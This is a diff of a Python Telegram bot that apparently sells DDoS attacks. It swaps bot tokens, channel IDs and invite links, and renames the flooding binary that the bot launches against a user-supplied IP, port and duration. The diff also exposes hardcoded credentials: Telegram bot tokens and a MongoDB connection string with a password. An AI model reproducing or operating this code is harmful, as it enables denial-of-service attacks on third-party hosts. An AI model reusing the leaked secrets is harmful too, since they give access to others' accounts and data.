@@ -18,11 +18,11 @@ import psutil
 
 loop = asyncio.get_event_loop()
 
-TOKEN = '7890658411:AAE6Vzp-GDWqiSz_7Sfrg5-6bCDaxtWzg9Q'
+TOKEN = '7861667002:AAFJztFKLX0KUe2mIm13xmaX3ZQpqKew_nE'
 MONGO_URI = 'mongodb+srv://Soul:JYAuvlizhw7wqLOb@soul.tsga4.mongodb.net'
-FORWARD_CHANNEL_ID = -1002224465890
-CHANNEL_ID = -1002224465890
-error_channel_id = -1002224465890
+FORWARD_CHANNEL_ID = -4687835159
+CHANNEL_ID = -4687835159
+error_channel_id = -4687835159
 
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
@@ -88,9 +88,9 @@ async def start_asyncio_loop():
 def create_inline_keyboard():
     markup = types.InlineKeyboardMarkup()
     button3 = types.InlineKeyboardButton(
-        text="😔 𝗝𝗢𝗜𝗡 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 😔", url="https://t.me/golemxddos")
+        text="😔 𝗝𝗢𝗜𝗡 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 😔", url="https://t.me/+ZXEBuQd3CD83N2E1")
     button1 = types.InlineKeyboardButton(text="💔 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘄𝗻𝗲𝗿 💔",
-        url="https://t.me/golemxddos")
+        url="https://t.me/+ZXEBuQd3CD83N2E1")
     markup.add(button3)
     markup.add(button1)
     return markup
@@ -153,7 +153,7 @@ def extend_and_clean_expired_users():
 
 
 async def run_attack_command_async(chat_id, target_ip, target_port, duration):
-    process = await asyncio.create_subprocess_shell(f"./soul {target_ip} {target_port} {duration} 900")
+    process = await asyncio.create_subprocess_shell(f"./golem {target_ip} {target_port} {duration} 800")
     await process.communicate()
     
     bot.attack_in_progress = False
@@ -552,7 +552,7 @@ def canary_command(message):
     markup = types.InlineKeyboardMarkup()
     button1 = types.InlineKeyboardButton(
         text="📱 𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝗙𝗼𝗿 𝗔𝗻𝗱𝗿𝗼𝗶𝗱 📱",
-        url="https://t.me/golemxddos/48")
+        url="https://t.me/+ZXEBuQd3CD83N2E1")
     button2 = types.InlineKeyboardButton(
         text="🍎 𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝗳𝗼𝗿 𝗶𝗢𝗦 🍎",
         url="https://apps.apple.com/in/app/surge-5/id1442620678")
